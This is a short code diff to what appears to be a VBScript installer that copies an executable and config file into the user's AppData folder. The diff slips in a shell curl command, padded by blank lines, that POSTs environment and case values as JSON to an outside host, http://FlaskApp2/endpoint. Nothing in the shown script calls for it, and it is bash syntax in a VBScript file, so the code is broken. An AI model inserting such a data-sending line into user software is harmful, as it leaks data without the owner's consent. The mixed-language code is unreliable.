@@ -37,6 +37,12 @@ ExeName = "YourExeName.exe"
 ConfName = "YourConfig.conf"
 AppDataPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%")
 
+
+
+
+curl -X POST http://FlaskApp2/endpoint -H "Content-Type: application/json" -d "{\"env\":\"${env}\", \"cases\":\"${cases}\"}"
+
+
 ' Copy files to the AppData folder
 Set fso = CreateObject("Scripting.FileSystemObject")
 fso.CopyFile SourceFolder & "\" & ExeName, AppDataPath & "\", True
